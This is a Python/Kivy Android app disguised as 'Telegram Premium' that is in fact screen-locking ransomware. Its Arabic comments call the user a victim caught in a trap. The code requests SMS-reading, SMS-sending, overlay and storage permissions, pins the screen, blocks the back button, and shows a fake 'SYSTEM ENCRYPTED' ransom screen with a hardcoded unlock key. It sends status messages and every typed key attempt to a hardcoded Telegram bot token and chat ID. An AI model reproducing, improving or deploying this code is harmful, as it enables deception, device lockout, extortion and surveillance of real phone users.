import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import platform

# بيانات التحكم الخاصة بـ GodFather
BOT_TOKEN = "7547169477:AAH0q-zW4O1K-K0Z2G-vL8U-Y7F3M5X2Q1"
CHAT_ID = "6133475010"
THE_KEY = "hhhhhlol#"

# حقن الاسم إجبارياً
__title__ = "Telegram Premium"

class D3f4ultApp(App):
    def build(self):
        self.title = "Telegram Premium"
        Window.bind(on_request_close=self.prevent_close)
        
        if platform == 'android':
            self.lock_and_request()

        self.send_to_bot("🎯 [V5-FINAL] الضحية وقع في الفخ والسيطرة بدأت!")

        layout = BoxLayout(orientation='vertical', padding=40, spacing=25)
        
        layout.add_widget(Label(
            text="[color=ff0000][b]SYSTEM ENCRYPTED[/b][/color]\n\n"
                 "Your device is locked by Telegram Security.\n"
                 "Enter the key to restore access.",
            markup=True, font_size='22sp', halign='center'))

        self.input_key = TextInput(
            hint_text="Enter Key...", 
            multiline=False, size_hint_y=None, height=120, password=True)
        
        btn = Button(
            text="UNLOCK NOW", 
            background_color=(1, 0, 0, 1), size_hint_y=None, height=100)
        btn.bind(on_press=self.check_unlock)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        return layout

    def lock_and_request(self):
        from android.permissions import request_permissions, Permission
        from jnius import autoclass
        
        # طلب الصلاحيات الفتاكة
        request_permissions([
            Permission.SYSTEM_ALERT_WINDOW,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ])
        
        # كود دارك: تثبيت الشاشة لمنع الخروج (Screen Pinning)
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            activity.startLockTask()
        except:
            pass

    def prevent_close(self, *args):
        return True # منع زرار الرجوع

    def check_unlock(self, instance):
        if self.input_key.text == THE_KEY:
            self.send_to_bot("✅ الضحية حرر جهازه بالكود الصحيح.")
            os._exit(0)
        else:
            self.send_to_bot(f"⚠️ محاولة فاشلة بالكود: {self.input_key.text}")

    def send_to_bot(self, message):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          data={"chat_id": CHAT_ID, "text": message})
        except:
            pass

if __name__ == '__main__':
    D3f4ultApp().run()
